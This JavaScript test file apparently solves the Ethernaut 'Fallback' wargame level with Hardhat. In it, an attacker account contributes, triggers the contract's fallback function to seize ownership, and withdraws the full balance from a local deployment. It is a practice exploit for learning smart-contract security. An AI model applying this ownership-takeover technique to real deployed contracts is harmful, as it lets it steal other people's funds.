const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Fallback", function () {
  before(async function () {
    this.fallbackFactory = await ethers.getContractFactory("Fallback");
  });
  beforeEach(async function () {
    [owner, attacker] = await ethers.getSigners();
    this.owner = owner;
    this.attacker = attacker;

    //deploy the contract as owner
    this.fallbackContract = await this.fallbackFactory.deploy();
    await this.fallbackContract.deployed();
  });

  it("Should have correct owner and correct owner balance", async function () {
    expect(await this.fallbackContract.owner()).to.be.equal(this.owner.address);
    expect(
      await this.fallbackContract.contributions(this.owner.address)
    ).to.equal(ethers.utils.parseEther("1000"));
  });

  it("Should be able to claim owner ship and withdraw all balances", async function () {
    // connect to the contract and perform the operations as the attacker.
    this.fallbackContract = await this.fallbackContract.connect(this.attacker);

    // Should do a contribution first.
    await this.fallbackContract.contribute({
      value: ethers.utils.parseEther("0.0005"),
    });

    // invoke the fallback function by sending a transaction with an empty data, i.e. to a function which is not defined in the contract.
    await this.attacker.sendTransaction({
      to: this.fallbackContract.address,
      value: ethers.utils.parseEther("0.0005"),
    });

    // check if the attacker is the new owner
    expect(await this.fallbackContract.owner()).to.equal(this.attacker.address);
    expect(await this.fallbackContract.owner()).to.not.equal(
      this.owner.address
    );

    // withdraw all the balances from the contract
    const contractBalanceBefore = await ethers.provider.getBalance(
      this.fallbackContract.address
    );
    expect(contractBalanceBefore).to.not.equal(0);
    await this.fallbackContract.withdraw();
    expect(
      await ethers.provider.getBalance(this.fallbackContract.address)
    ).to.equal(0);
  });
});
